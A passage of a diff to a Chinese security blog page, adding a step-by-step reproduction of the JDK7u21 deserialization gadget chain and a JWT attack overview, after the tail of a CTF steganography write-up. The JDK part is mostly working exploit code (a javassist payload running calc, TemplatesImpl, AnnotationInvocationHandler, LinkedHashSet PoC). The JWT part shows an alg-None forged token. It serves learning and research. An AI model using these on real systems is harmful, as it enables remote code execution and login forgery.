-</code></pre>
-<p>等脚本跑完后成功恢复原来的视频文件</p>
-<p>视频隐写通常把内容存储在视频中的某个图片,我们用 ffmpeg ,将视频分离成图片</p>
-<p><code>ffmpeg -i NBA2.mp4 -f image2 image%d.jpg</code></p>
-<p>一张一张看过去,我们发现,在第3028张突然全黑了</p>
-<p><img src="https://i.loli.net/2020/02/20/Q9dsOuiVGFgwAcm.png" alt="image1136"></p>
-<p>调整一下图片的对比对,跑出一个二维码</p>
-<p><img src="https://i.loli.net/2020/02/20/aE3PpqcrJzn852V.png" alt="image1223"></p>
-<p><code>flag{I_l0v3_pl4ying_b4sk3tb4ll}</code></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/20/某misc/">http://blog.ccreater.top/2020/02/20/某misc/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/20/%E6%9F%90misc/" data-id="ckmn4mn3w007qg4nihypwg6yz" data-title="某misc" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
-    <article id="post-js原型链污染" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date">
-  <time class="dt-published" datetime="2020-02-18T10:18:01.991Z" itemprop="datePublished">2020-02-18</time>
+    <a href="/1970/01/01/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
 </a>
     
   <div class="article-category">
@@ -778,7 +84,564 @@ f2.write(t2)
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
+      <a class="p-name article-title" href="/1970/01/01/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">jdk7u21反序列化复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="JDK7u21反序列化链复现"><a href="#JDK7u21反序列化链复现" class="headerlink" title="JDK7u21反序列化链复现"></a>JDK7u21反序列化链复现</h1><p>exp:</p>
+<pre><code class="java">public class jdk7u21 {
+    public static void main(String[] args) throws Exception {
+
+            TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc&quot;);//生成恶意的calc
+            calc.getOutputProperties();//调用getOutputProperties就可以执行calc
+    }
+}</code></pre>
+<p>一步步调试发现在<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>弹出calc<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201004163506.png" alt="image466"><br>第380行是触发命令执行的点</p>
+<h2 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h2><pre><code class="java">public class instance {
+    static{
+        try {
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    public static void main(String args[]){
+        try {
+            instance.class.newInstance();
+        } catch (InstantiationException e) {
+            e.printStackTrace();
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        }
+
+    }
+}
+
+</code></pre>
+<p>将恶意代码放在static或构造方法中便可以在初始化时执行恶意代码</p>
+<h2 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance"></a>getTransletInstance</h2><p>逐句执行观察到命令执行的限制条件与getOutputProperties和newTransformer没有太大关系<br>在getTransletInstance中发现一系列的限制</p>
+<pre><code class="java">private Translet getTransletInstance()
+        throws TransformerConfigurationException {
+        try {
+            if (_name == null) return null;//TemplatesImpl._name!=null
+
+            if (_class == null) defineTransletClasses();//TemplatesImpl._class==null
+
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//_transletIndex在defineTransletClasses中定义
+            translet.postInitialization();
+            translet.setTemplates(this);
+            translet.setServicesMechnism(_useServicesMechanism);
+            if (_auxClasses != null) {
+                translet.setAuxiliaryClasses(_auxClasses);
+            }
+
+            return translet;
+        }
+        catch (InstantiationException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+        catch (IllegalAccessException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+    }</code></pre>
+<p>TemplatesImpl._name!=null和TemplatesImpl._class==null是执行到newInstance处的必要条件<br>而_transletIndex也是在defineTransletClasses中定义<br>跟进defineTransletClasses查找进一步的限制条件</p>
+<h2 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses"></a>defineTransletClasses</h2><pre><code class="java">private void defineTransletClasses()
+        throws TransformerConfigurationException {
+
+        if (_bytecodes == null) {//_bytecodes!=null
+            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
+            throw new TransformerConfigurationException(err.toString());
+        }
+
+        TransletClassLoader loader = (TransletClassLoader)
+            AccessController.doPrivileged(new PrivilegedAction() {
+                public Object run() {
+                    return new TransletClassLoader(ObjectFactory.findClassLoader());
+                }
+            });
+
+        try {
+            final int classCount = _bytecodes.length;
+            _class = new Class[classCount];
+
+            if (classCount &gt; 1) {
+                _auxClasses = new Hashtable();
+            }
+
+            for (int i = 0; i &lt; classCount; i++) {
+                _class[i] = loader.defineClass(_bytecodes[i]);
+                final Class superClass = _class[i].getSuperclass();
+
+                // Check if this is the main class
+                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+                    _transletIndex = i;
+                }//_class.superClass==com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
+                else {
+                    _auxClasses.put(_class[i].getName(), _class[i]);
+                }
+            }
+
+            ...
+        }
+        ...
+    }</code></pre>
+<p>阅读代码发现<code>_class[i] = loader.defineClass(_bytecodes[i]);</code>加载了我们的恶意类，但是它必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类<br>_bytecodes!=null<br>综上我们可以得知要执行到恶意代码的触发点需要满足以下条件</p>
+<pre><code>1. TemplatesImpl._name!=null
+2. TemplatesImpl._class==null
+3. _bytecodes!=null
+4. 恶意类是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类
+5. TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法（其他版本的限制条件）</code></pre><p>关于第五点的相关代码是(与7u21略有不同)：</p>
+<pre><code class="java">TransletClassLoader loader = (TransletClassLoader)
+            AccessController.doPrivileged(new PrivilegedAction() {
+                public Object run() {
+                    return new 
+        //限制条件4：TemplatesImpl类中的_tfactory变量需要有一个getExternalExtensionsMap方法
+        //           即需要是一个TransformerFactoryImpl类
+   TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
+                }
+            });</code></pre>
+<h2 id="尝试自己写一个POC"><a href="#尝试自己写一个POC" class="headerlink" title="尝试自己写一个POC"></a>尝试自己写一个POC</h2><h3 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl"></a>Gadgets.createTemplatesImpl</h3><p>跟进</p>
+<pre><code class="java">public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
+        final TemplatesImpl templates = new TemplatesImpl();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+        // run command in static initializer
+        clazz.makeClassInitializer()
+                .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;
+                        + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)
+                        + &quot;\&quot;);&quot;);
+        // unique name to allow repeated execution (watch out for PermGen exhaustion)
+        clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());//Sets the class name
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {
+                classBytes,
+                ClassFiles.classAsBytes(Foo.class)});
+//                  classBytes});
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
+//        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        return templates;
+    }</code></pre>
+<p>其中clazz是我们的恶意类装在templates的_bytecodes中，templates满足了其他的限制条件<br>这里用了javassist来构造我们的恶意类</p>
+<h3 id="javassist简介"><a href="#javassist简介" class="headerlink" title="javassist简介"></a>javassist简介</h3><p><a href="https://www.cnblogs.com/rickiyang/p/11336268.html" target="_blank" rel="noopener">https://www.cnblogs.com/rickiyang/p/11336268.html</a></p>
+<pre><code class="java">
+    ClassPool pool = ClassPool.getDefault();
+    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+    clazz.makeClassInitializer()//Makes an empty class initializer (static constructor).
+                    .insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;
+                            + command.replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;)
+                            + &quot;\&quot;);&quot;);//在方法后面添加代码
+    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</code></pre>
+<h3 id="自己实现"><a href="#自己实现" class="headerlink" title="自己实现"></a>自己实现</h3><pre><code class="java">public class myjdk7u21 {
+    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+        }
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+        }
+
+    }
+    public static void main(String args[]) throws NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException {
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(evil.class));
+        CtClass evilobj = pool.get(evil.class.getName());
+        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());
+
+        final TemplatesImpl tpl = new TemplatesImpl();
+        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);
+        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);
+        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});
+        tpl.getOutputProperties();
+
+    }
+    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
+        Field field = clazz.getDeclaredField(key);
+        field.setAccessible(true);
+        field.set(obj,value);
+    }
+}
+</code></pre>
+<p>遇到的坑：evil记得声明为public，不然默认是private,就无法newInstance了</p>
+<h2 id="动态代理AnnotationInvocationHandler"><a href="#动态代理AnnotationInvocationHandler" class="headerlink" title="动态代理AnnotationInvocationHandler"></a>动态代理AnnotationInvocationHandler</h2><p>利用动态代理来接近反序列化后直接RCE的目的</p>
+<pre><code class="java">        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];
+        ctor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,new HashMap());
+
+        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);
+        proxy.equals(tpl);</code></pre>
+<p>我们看下AnnotationInvocationHandler的构造方法</p>
+<pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {
+        this.type = var1;
+        this.memberValues = var2;
+    }</code></pre>
+<p>type和memberValues皆可控</p>
+<p>debug跟进<br>proxy.equals 调用了动态代理AnnotationInvocationHandler的invoke方法</p>
+<pre><code class="java">    public Object invoke(Object var1, Method var2, Object[] var3) {
+            String var4 = var2.getName();
+            Class[] var5 = var2.getParameterTypes();
+            if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
+                return this.equalsImpl(var3[0]);
+            }
+            ...
+    }</code></pre>
+<p>方法名为equals且只有一个参数，这进入<code>this.equalsImpl(var3[0]);</code></p>
+<p>equalsImpl</p>
+<pre><code class="java">private Boolean equalsImpl(Object var1) {
+        if (var1 == this) {
+            return true;
+        } else if (!this.type.isInstance(var1)) {
+            return false;
+        } else {
+            Method[] var2 = this.getMemberMethods();
+            int var3 = var2.length;
+
+            for(int var4 = 0; var4 &lt; var3; ++var4) {
+                Method var5 = var2[var4];
+                String var6 = var5.getName();
+                Object var7 = this.memberValues.get(var6);
+                Object var8 = null;
+                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
+                if (var9 != null) {
+                    var8 = var9.memberValues.get(var6);
+                } else {
+                    try {
+                        var8 = var5.invoke(var1);
+                    } catch (InvocationTargetException var11) {
+                        return false;
+                    } catch (IllegalAccessException var12) {
+                        throw new AssertionError(var12);
+                    }
+                }...
+            }
+        }
+    }</code></pre>
+<p>在这个方法中调用了<code>var8 = var5.invoke(var1);</code>,相当于var1.var5(),其中var1是a.equals(b)中的b<br>var5是this.type的第一个方法(this.getMemberMethods()[0])<br>跟进getMemberMethods</p>
+<pre><code class="java">private Method[] getMemberMethods() {
+        if (this.memberMethods == null) {
+            this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() {
+                public Method[] run() {
+                    Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
+                    AccessibleObject.setAccessible(var1, true);
+                    return var1;
+                }
+            });
+        }
+
+        return this.memberMethods;
+    }</code></pre>
+<p>也就是说我们可以通过控制this.type从而调用xx.equals(evilObj),来达到evilObj.AnyMethod()的效果<br>这也恰好符合了我们想调用evilObj.getOutputProperties()情况<br>最后选择了Templates,它的第一个方法是newTransformer,漏洞点在newTransformer中触发</p>
+<h2 id="LinkedHashSet反序列化调用equals"><a href="#LinkedHashSet反序列化调用equals" class="headerlink" title="LinkedHashSet反序列化调用equals"></a>LinkedHashSet反序列化调用equals</h2><p>问我为啥知道这里可以，答：别人发现的<br>LinkedHashSet没有实现readObject方法而是调用了HashSet的readObject方法，既然如此，为啥不直接调用HashSet嘞<br>等下就知道了<br>HashSet::readObject</p>
+<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        // Read in any hidden serialization magic
+        s.defaultReadObject();
+
+        // Read in HashMap capacity and load factor and create backing HashMap
+        int capacity = s.readInt();
+        float loadFactor = s.readFloat();
+        map = (((HashSet)this) instanceof LinkedHashSet ?
+               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
+               new HashMap&lt;E,Object&gt;(capacity, loadFactor));
+
+        // Read in size
+        int size = s.readInt();
+
+        // Read in all elements in the proper order.
+        for (int i=0; i&lt;size; i++) {
+            E e = (E) s.readObject();
+            map.put(e, PRESENT);
+        }
+    }</code></pre>
+<p>跟进HashMap::put方法</p>
+<pre><code class="java">public V put(K key, V value) {
+        if (key == null)
+            return putForNullKey(value);
+        int hash = hash(key);
+        int i = indexFor(hash, table.length);
+        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
+            Object k;
+            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
+                V oldValue = e.value;
+                e.value = value;
+                e.recordAccess(this);
+                return oldValue;
+            }
+        }
+
+        modCount++;
+        addEntry(hash, key, value, i);
+        return null;
+    }</code></pre>
+<p>我们看到key.equals(k)完美的符合了我们的预期<br>这里得是顺序调用才能常出现proxy.equals(evilObj),所以用了LinkedHashSet<br>但是在这之前我们要满足两个条件</p>
+<ol>
+<li>e.hash == hash即hash(proxy) == hash(evilObj)</li>
+<li>e.key!=key即proxy!=evilObj<br>第二个条件很容易满足，第一个条件就GG了<br>跟进int hash = hash(key);中的hash方法看一下发现</li>
+</ol>
+<pre><code class="java">final int hash(Object k) {
+        int h = 0;
+        if (useAltHashing) {
+            if (k instanceof String) {
+                return sun.misc.Hashing.stringHash32((String) k);
+            }
+            h = hashSeed;
+        }
+
+        h ^= k.hashCode();
+
+        // This function ensures that hashCodes that differ only by
+        // constant multiples at each bit position have a bounded
+        // number of collisions (approximately 8 at default load factor).
+        h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
+        return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
+    }</code></pre>
+<p>调用了key的hashCode方法，即进入了AnnotationInvocationHandler的invoke方法<br>见证奇迹的时刻：<br>在invoke中有这样的一句话：</p>
+<pre><code>if (var4.equals(&quot;hashCode&quot;)) {
+    return this.hashCodeImpl();</code></pre><p>跟进hashCodeImpl</p>
+<pre><code class="java">    private int hashCodeImpl() {
+        int var1 = 0;
+
+        Entry var3;
+        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
+            var3 = (Entry)var2.next();
+        }
+
+        return var1;
+    }</code></pre>
+<p>我们关注<code>var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code><br>这相当于<code>127*key.hashcode()^Arrays.hashCode((Object[])((Object[])value))</code><br>因为0^x=x,且<em>优先级大于^,所以令key.hashcode()=0使得e.hash == hash最终变成<br>127</em>key.hashcode()^Arrays.hashCode((Object[])((Object[])value))=0^value.hashcode()==value.hashcode()<br>所以构造</p>
+<pre><code class="java">package org.example;
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.*;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.LinkedHashSet;
+
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+
+
+public class myjdk7u21 {
+
+    public static class evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Serializable{
+
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+        }
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+        }
+
+    }
+
+    public static void main(String args[]) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(evil.class));
+        CtClass evilobj = pool.get(evil.class.getName());
+        evilobj.makeClassInitializer().insertAfter(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
+        evilobj.setName(&quot;ccreater233&quot;+System.nanoTime());
+
+        final TemplatesImpl tpl = new TemplatesImpl();
+        setField(TemplatesImpl.class,tpl,&quot;_name&quot;,&quot;ccreater&quot;);
+        setField(TemplatesImpl.class,tpl,&quot;_class&quot;,null);
+        setField(TemplatesImpl.class,tpl,&quot;_bytecodes&quot;,new byte[][]{evilobj.toBytecode()});
+        //evil instance
+
+        //tpl.getOutputProperties();
+        final Constructor&lt;?&gt; ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];
+        ctor.setAccessible(true);
+        HashMap map = new HashMap();
+        map.put(&quot;f5a5a608&quot;,&quot;23333&quot;);
+        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);
+
+        TempInt proxy = (TempInt)Proxy.newProxyInstance(TempInt.class.getClassLoader(),new Class[]{TempInt.class},invocationHandler);
+
+        HashSet a = new LinkedHashSet();
+        a.add(tpl);
+        a.add(proxy);
+        map.put(&quot;f5a5a608&quot;,tpl);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        //序列化
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(a);//序列化对象
+        objectOutputStream.flush();
+        objectOutputStream.close();
+        //反序列化
+        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        Object o = objectInputStream.readObject();
+
+    }
+    public static void setField(Class clazz,Object obj,String key,Object value) throws NoSuchFieldException, IllegalAccessException {
+        Field field = clazz.getDeclaredField(key);
+        field.setAccessible(true);
+        field.set(obj,value);
+    }
+}
+</code></pre>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/jdk7u21反序列化复现/">https://www.ccreater.top/1970/01/01/jdk7u21反序列化复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.ccreater.top/1970/01/01/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" data-id="ckmn57575005ws1nicp0z07hm" data-title="jdk7u21反序列化复现" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
+    <article id="post-jwt攻击方式" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1970/01/01/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/1970/01/01/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">jwt攻击方式</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p> <a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p>
+<p>  <a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a> </p>
+<h2 id="关于jwt"><a href="#关于jwt" class="headerlink" title="关于jwt"></a>关于jwt</h2><p>JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p>
+<p>jwt由三个部分组成：<code>header</code>.<code>payload</code>.<code>signature</code></p>
+<h3 id="header部分"><a href="#header部分" class="headerlink" title="header部分"></a>header部分</h3><p>header部分最常用的两个字段是<code>alg</code>和<code>typ</code>，<code>alg</code>指定了token加密使用的算法（最常用的为<em>HMAC</em>和<em>RSA</em>算法），typ`声明类型为JWT</p>
+<p>header通常会长这个样子：</p>
+<pre><code>{
+        &quot;alg&quot; : &quot;HS256&quot;,
+        &quot;typ&quot; : &quot;jwt&quot;
+}</code></pre><h3 id="payload部分"><a href="#payload部分" class="headerlink" title="payload部分"></a>payload部分</h3><p>payload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据</p>
+<pre><code>{
+        &quot;user_role&quot; : &quot;finn&quot;,    //当前登录用户
+    &quot;iss&quot;: &quot;admin&quot;,          //该JWT的签发者
+    &quot;iat&quot;: 1573440582,        //签发时间
+    &quot;exp&quot;: 1573940267,        //过期时间
+    &quot;nbf&quot;: 1573440582,         //该时间之前不接收处理该Token
+    &quot;domain&quot;: &quot;example.com&quot;,   //面向的用户
+    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Token唯一标识
+}</code></pre><h3 id="signature部分"><a href="#signature部分" class="headerlink" title="signature部分"></a>signature部分</h3><p>signature的功能是保护token完整性。</p>
+<p>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。</p>
+<p>抽象成公式就是</p>
+<pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</code></pre><p>值得注意的是，编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。</p>
+<h3 id="完整token生成"><a href="#完整token生成" class="headerlink" title="完整token生成"></a>完整token生成</h3><p>一个完整的jwt格式为(<code>header</code>.<code>payload</code>.<code>signature</code>)，其中header、payload使用base64url编码，signature通过指定算法生成。</p>
+<p>python的<code>Pyjwt</code>使用示例如下</p>
+<pre><code>import jwt
+
+encoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, algorithm=&#39;HS256&#39;)
+print(encoded_jwt)
+print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;]))</code></pre><p>生成的token为</p>
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.`eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.oL5szC7mFoJ_7FI9UVMcKfmisqr6Qlo1dusps5wOUlo</code></pre><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><h4 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h4><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>
+<p>这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。举个例子，使用以下的字段</p>
+<pre><code>{
+    &quot;alg&quot; : &quot;None&quot;,
+    &quot;typ&quot; : &quot;jwt&quot;
+}
+
+{
+    &quot;user&quot; : &quot;Admin&quot;
+}</code></pre><p>生成的完整token为<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p>
+<p>(header+’.’+payload，去掉了’.’+signature字段)</p>
+<p>空加密算法的设计初衷是用于调试的，但是如果某天开发人员脑阔瓦特了，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p>
+<h4 id="修改RSA加密算法为HMAC"><a href="#修改RSA加密算法为HMAC" class="headerlink" title="修改RSA加密算法为HMAC"></a>修改RSA加密算法为HMAC</h4><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>工具 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/jwt攻击方式/">https://www.ccreater.top/1970/01/01/jwt攻击方式/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.ccreater.top/1970/01/01/jwt%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" data-id="ckmn57576005zs1ni9jaff449" data-title="jwt攻击方式" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
